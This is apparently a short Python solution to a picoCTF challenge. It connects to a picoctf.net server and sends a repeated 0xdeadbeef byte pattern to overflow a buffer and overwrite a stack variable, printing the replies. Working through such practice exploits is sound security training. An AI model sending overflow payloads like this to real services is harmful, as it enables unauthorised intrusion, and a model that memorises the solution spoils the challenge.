import socket
import time

# サーバーに接続
ip='mars.picoctf.net'
port=31890
sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect((ip, port))


time.sleep(1)
print(sc.recv(1024))
deadbeef = b"\xef\xbe\xad\xde\x00\x00\x00\x00"*40+b"\n"
sc.sendall(deadbeef)

print(sc.recv(1024))
time.sleep(1)
print(sc.recv(1024))


print("Done!")